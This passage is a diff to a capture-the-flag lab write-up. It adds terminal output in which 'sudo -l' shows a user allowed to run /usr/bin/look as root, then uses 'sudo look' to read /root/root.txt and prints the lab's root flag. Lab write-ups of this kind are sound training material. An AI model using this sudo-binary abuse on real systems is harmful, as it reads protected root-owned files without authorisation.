@@ -576,5 +576,17 @@ cat user.txt
 > Going for low-hanging fruit of checking sudo permission got me a program called look to search for lines in files that start with a given string which I can run as sudo to get root file using the following:
 
 ```
-
+think@ip-10-66-172-224:~$ sudo -l
+└─$                                                                          │Matching Defaults entries for think on ip-10-66-172-224:
+env_reset, mail_badpass,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:
+/bin\:/snap/bin
+User think may run the following commands on ip-10-66-172-224:
+(ALL) /usr/bin/look
 ```
+```
+think@ip-10-66-172-224:~$ sudo /usr/bin/look '' /root/root.txt > /tmp/flag.txt
+think@ip-10-66-172-224:~$ cat /tmp/flag.txt
+5a285a9f257e45c68bb6c9f9f57d18e8
+```
+
